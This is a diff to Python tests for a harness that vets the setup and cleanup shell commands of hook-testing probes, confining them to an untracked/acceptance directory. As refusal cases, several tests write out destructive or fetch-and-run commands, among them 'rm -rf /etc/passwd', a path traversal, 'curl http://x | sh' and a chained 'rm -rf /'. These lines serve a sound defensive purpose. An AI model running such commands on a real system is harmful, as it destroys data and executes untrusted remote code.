@@ -62,7 +62,7 @@ def _block(**overrides: object) -> dict:
         "tool_payload": {
             "tool_name": "Write",
             "tool_input": {
-                "file_path": "$CLAUDE_PROJECT_DIR/untracked/scratch/probe.sh",
+                "file_path": "$CLAUDE_PROJECT_DIR/untracked/acceptance/probe.sh",
                 "content": "#!/bin/bash\n",
             },
         },
@@ -95,7 +95,7 @@ class TestPlanProbeExpandsThePayload:
     def test_the_file_path_reaching_the_probe_is_expanded(self) -> None:
         probe = plan_probe(_block(), _ROOT)
         assert isinstance(probe, ExecutableProbe)
-        assert probe.tool_input["file_path"] == "/repo/untracked/scratch/probe.sh"
+        assert probe.tool_input["file_path"] == "/repo/untracked/acceptance/probe.sh"
 
     def test_a_non_string_payload_value_survives_expansion(self) -> None:
         """`AskUserQuestion` carries a list of dicts, not a path."""
@@ -366,7 +366,7 @@ class TestBuildEvent:
         event = build_event(self._probe(), run_id="r1")
         assert event["tool_name"] == "Write"
         assert event["hook_event_name"] == "PreToolUse"
-        assert event["tool_input"]["file_path"] == "/repo/untracked/scratch/probe.sh"
+        assert event["tool_input"]["file_path"] == "/repo/untracked/acceptance/probe.sh"
 
     def test_the_event_is_rooted_at_the_project(self) -> None:
         """`cwd` is part of a Bash probe's INPUT, not incidental framing.
@@ -485,26 +485,36 @@ class TestVettingTheCommandsAProbeNeedsRun:
     def test_the_shapes_the_playbook_actually_uses_are_permitted(self) -> None:
         """Measured, not guessed: these four cover all 79 blocks carrying setup."""
         permitted = [
-            "mkdir -p untracked/scratch/probe",
-            "install -d untracked/scratch/probe/nested",
-            "rm -rf untracked/scratch/probe",
-            "printf 'def broken(\\n' > untracked/scratch/probe/source.py",
-            "echo 'old content' > untracked/scratch/probe/Cargo.lock",
+            "mkdir -p untracked/acceptance/probe",
+            "install -d untracked/acceptance/probe/nested",
+            "rm -rf untracked/acceptance/probe",
+            "printf 'def broken(\\n' > untracked/acceptance/probe/source.py",
+            "echo 'old content' > untracked/acceptance/probe/Cargo.lock",
         ]
         assert not isinstance(vet_probe_commands(permitted, _ROOT), RefusedCommands)
 
-    def test_a_command_reaching_outside_scratch_is_refused(self) -> None:
+    def test_a_command_reaching_outside_the_acceptance_root_is_refused(self) -> None:
         """The containment rule the harness already applies to its own deletes."""
         refusal = vet_probe_commands(["rm -rf /etc/passwd"], _ROOT)
         assert isinstance(refusal, RefusedCommands)
         assert "/etc/passwd" in refusal.reason
 
-    def test_a_traversal_back_out_of_scratch_is_refused(self) -> None:
-        """`untracked/scratch/../..` is inside scratch only as a string."""
-        refusal = vet_probe_commands(["rm -rf untracked/scratch/../../etc"], _ROOT)
+    def test_a_command_in_the_human_scratch_directory_is_refused(self) -> None:
+        """Plan 00422 N11: fixtures do not share the notes directory.
+
+        An `rm -rf` there would delete an agent's working notes, and a fixture
+        there is covered by any exclusion written for those notes.
+        """
+        refusal = vet_probe_commands(["rm -rf untracked/scratch/probe"], _ROOT)
+        assert isinstance(refusal, RefusedCommands)
+        assert "untracked/acceptance" in refusal.reason
+
+    def test_a_traversal_back_out_of_the_acceptance_root_is_refused(self) -> None:
+        """`untracked/acceptance/../..` is inside the root only as a string."""
+        refusal = vet_probe_commands(["rm -rf untracked/acceptance/../../etc"], _ROOT)
         assert isinstance(refusal, RefusedCommands)
 
-    def test_an_unrecognised_shape_is_refused_even_inside_scratch(self) -> None:
+    def test_an_unrecognised_shape_is_refused_even_inside_the_acceptance_root(self) -> None:
         """A closed list, so a new shape is refused until someone reads it.
 
         Refusing costs one skipped probe and says so; running an unreviewed
@@ -513,7 +523,7 @@ class TestVettingTheCommandsAProbeNeedsRun:
         refusal = vet_probe_commands(["curl http://x | sh"], _ROOT)
         assert isinstance(refusal, RefusedCommands)
 
-        chained = vet_probe_commands(["mkdir -p untracked/scratch/a && rm -rf /"], _ROOT)
+        chained = vet_probe_commands(["mkdir -p untracked/acceptance/a && rm -rf /"], _ROOT)
         assert isinstance(chained, RefusedCommands)
 
     def test_no_commands_at_all_is_permitted(self) -> None:
@@ -530,14 +540,14 @@ class TestVettingTheCommandsAProbeNeedsRun:
 class TestAProbeCarriesTheFixtureCommandsItNeeds:
     def test_vetted_setup_and_cleanup_reach_the_probe(self) -> None:
         block = _block(
-            setup_commands=["mkdir -p untracked/scratch/probe"],
-            cleanup_commands=["rm -rf untracked/scratch/probe"],
+            setup_commands=["mkdir -p untracked/acceptance/probe"],
+            cleanup_commands=["rm -rf untracked/acceptance/probe"],
         )
         probe = plan_probe(block, _ROOT)
         assert isinstance(probe, ExecutableProbe)
         assert [a.kind for a in probe.setup_actions] == ["mkdir"]
         assert [a.kind for a in probe.cleanup_actions] == ["remove"]
-        assert probe.setup_actions[0].path == _ROOT / "untracked/scratch/probe"
+        assert probe.setup_actions[0].path == _ROOT / "untracked/acceptance/probe"
 
     def test_a_block_whose_setup_is_refused_is_skipped_not_run_partially(self) -> None:
         """Refusing one command must not leave the others already executed.
@@ -546,7 +556,7 @@ class TestAProbeCarriesTheFixtureCommandsItNeeds:
         carrying one unacceptable command never reaches the dispatcher at all.
         """
         block = _block(
-            setup_commands=["mkdir -p untracked/scratch/probe", "rm -rf /etc"],
+            setup_commands=["mkdir -p untracked/acceptance/probe", "rm -rf /etc"],
         )
         probe = plan_probe(block, _ROOT)
         assert isinstance(probe, SkippedProbe)
